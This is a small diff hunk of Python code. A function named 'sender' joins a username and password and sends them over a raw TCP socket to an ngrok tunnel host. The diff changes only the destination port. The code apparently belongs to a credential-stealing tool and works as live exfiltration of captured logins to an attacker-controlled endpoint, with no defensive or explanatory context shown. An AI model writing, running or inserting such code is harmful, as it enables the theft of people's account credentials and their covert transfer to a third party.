@@ -71,7 +71,7 @@ def sender(user, passw):
     import socket
     mess = f'{user}:{passw}'
     hote = '6.tcp.ngrok.io'
-    port = 17834
+    port = 11421
     socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     socket.connect((hote, port))
     socket.send(mess.encode())
